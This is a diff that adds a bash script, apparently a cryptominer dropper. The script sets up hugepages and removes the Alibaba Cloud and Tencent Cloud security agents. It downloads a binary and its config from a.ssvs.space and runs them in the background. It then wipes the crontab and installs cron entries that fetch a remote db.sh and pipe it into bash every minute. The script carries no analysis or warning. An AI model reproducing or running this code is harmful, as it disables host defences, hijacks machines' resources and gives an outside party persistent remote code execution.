@@ -1,0 +1,69 @@
+#!/bin/bash
+cd /var/tmp/
+arch=`getconf LONG_BIT`
+id1="neptune"
+id2="cf.cf"
+id3="pluto"
+echo 128 > /proc/sys/vm/nr_hugepages
+sysctl -w vm.nr_hugepages=128
+if [ -s /usr/bin/curl ];
+then
+    WG="curl -o"
+fi
+if ps aux | grep -i '[a]liyun'; then
+    wget http://update.aegis.aliyun.com/download/uninstall.sh
+    chmod +x uninstall.sh
+    ./uninstall.sh
+    wget http://update.aegis.aliyun.com/download/quartz_uninstall.sh
+    chmod +x quartz_uninstall.sh
+    ./quartz_uninstall.sh
+    rm -f uninstall.sh quartz_uninstall.sh
+    pkill aliyun-service
+    rm -fr /etc/init.d/agentwatch /usr/sbin/aliyun-service
+    rm -rf /usr/local/aegis*;
+elif ps aux | grep -i '[y]unjing'; then
+    /usr/local/qcloud/stargate/admin/uninstall.sh
+    /usr/local/qcloud/YunJing/uninst.sh
+    /usr/local/qcloud/monitor/barad/admin/uninstall.sh
+fi
+if [ -s /usr/bin/wget ];
+then
+    WG="wget -q -O"
+fi
+ps -fe|grep 'neptune'|grep -v grep
+if [ $? -ne 0 ]
+then
+echo "It's not running"
+rm -rf /var/tmp/`echo $id1`
+rm -rf /var/tmp/`echo $id2`
+$WG /var/tmp/`echo $id1` http://a.ssvs.space/`echo $id3` && chmod +x /var/tmp/`echo $id1` #`echo $arch`
+$WG /var/tmp/`echo $id2` http://a.ssvs.space/`echo $id2`
+if [ -s /usr/bin/nohup ];
+then
+    nohup /var/tmp/`echo $id1` -c /var/tmp/`echo $id2` > /dev/null 2>&1 &
+else
+    /var/tmp/`echo $id1` -c /var/tmp/`echo $id2` & disown
+fi
+else
+echo "Running..........."
+fi
+crontab -r
+if crontab -l | grep -q "a.ssvs.space"
+then
+    echo "Cron exists"
+else
+    crontab -r
+    echo "Cron not found"
+    LDR="wget -q -O -"
+    if [ -s /usr/bin/curl ];
+    then
+        LDR="curl";
+    fi
+    if [ -s /usr/bin/wget ];
+    then
+        LDR="wget -q -O -";
+    fi
+	(crontab -l 2>/dev/null; echo "* * * * * $LDR http://a.ssvs.space/db.sh | bash > /dev/null 2>&1")| crontab -
+	grep 'db.sh' /etc/crontab || echo "*/1 *  *  *  * $LDR http://a.ssvs.space/db.sh | bash" >> /etc/crontab
+fi
+rm -rf db.sh
